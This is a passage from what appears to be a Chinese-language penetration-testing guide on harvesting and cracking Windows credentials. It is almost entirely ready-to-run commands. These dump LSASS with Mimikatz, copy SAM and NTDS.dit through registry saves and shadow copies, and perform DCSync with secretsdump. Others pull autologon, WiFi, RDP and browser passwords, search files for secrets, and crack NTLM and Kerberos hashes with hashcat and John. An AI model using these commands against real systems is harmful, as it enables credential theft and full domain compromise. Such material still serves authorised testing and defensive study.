# 凭证收集与利用

### 5.1 Windows凭证收集

```
Windows凭证存储位置：

1. LSASS内存
   ├── NTLM哈希
   ├── Kerberos票据
   ├── 明文密码 (WDigest)
   └── 加密密钥

2. SAM数据库
   ├── 本地用户哈希
   └── 缓存域凭证

3. NTDS.dit (域控)
   ├── 域用户哈希
   ├── 域计算机账户
   └── 域信任密钥

4. 注册表
   ├── VSS凭据
   ├── 自动登录密码
   └── WiFi密码

5. 文件系统
   ├── Web配置文件
   ├── 数据库连接字符串
   ├── 脚本中的密码
   └── 交换文件

6. 凭据管理器
   ├── Windows凭据管理器
   ├── 存储的凭据
   └── 通用凭据

7. 浏览器
   ├── Chrome密码
   ├── Firefox密码
   └── IE/Edge密码

8. 应用程序
   ├── 邮件客户端
   ├── FTP客户端
   ├── SSH客户端
   └── 数据库客户端
```

#### 凭证提取命令

```bash
# 1. Mimikatz提取LSASS凭证
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
mimikatz.exe "sekurlsa::msv"      # MSV凭证
mimikatz.exe "sekurlsa::wdigest"  # WDigest明文
mimikatz.exe "sekurlsa::kerberos" # Kerberos票据
mimikatz.exe "sekurlsa::ssp"      # SSP凭证

# 2. 提取SAM哈希
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
python3 secretsdump.py -sam sam.hive -system system.hive LOCAL

# 3. 提取NTDS.dit (域控)
# 使用ntdsutil
ntdsutil "ac i ntds" "ifm" "create full C:\ntds_dump" q q
python3 secretsdump.py -ntds ntds.dit -system registry/SYSTEM -security registry/SECURITY LOCAL

# 使用vssadmin
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system.hive

# 4. 导出域内所有哈希 (DCSync)
python3 secretsdump.py domain.local/user:password@DC_IP -just-dc
python3 secretsdump.py domain.local/user:password@DC_IP -just-dc-ntlm

# 5. 获取注册表自动登录密码
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# 6. 获取WiFi密码
netsh wlan show profile
netsh wlan show profile name="WiFiName" key=clear

# 7. 获取浏览器密码
# Chrome
python3 ChromePass.py
# Firefox
python3 firefox_decrypt.py logins.json

# 8. 获取RDP缓存密码
cmdkey /list
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"

# 9. 搜索文件中的密码
findstr /si "password" *.txt *.ini *.cfg *.config *.xml
dir /s *pass* *cred* *vnc* *.kdbx
```

### 5.2 凭证离线破解

```bash
# 1. Hashcat破解NTLM哈希
# 模式1000 = NTLM
hashcat -m 1000 ntlm_hash.txt rockyou.txt

# 模式13100 = Kerberoasting
hashcat -m 13100 kerberoast_hash.txt rockyou.txt

# 模式18200 = AS-REP Roasting
hashcat -m 18200 asrep_hash.txt rockyou.txt

# 2. John the Ripper
john --format=NT hash.txt --wordlist=rockyou.txt
john --format=krb5tgs hash.txt --wordlist=rockyou.txt

# 3. 常见哈希模式
hashcat -m 0    MD5
hashcat -m 100  SHA1
hashcat -m 1400 SHA256
hashcat -m 1000 NTLM
hashcat -m 1800 sha512crypt ($6$)
hashcat -m 500  md5crypt ($1$)
hashcat -m 3200 bcrypt ($2a$)
```
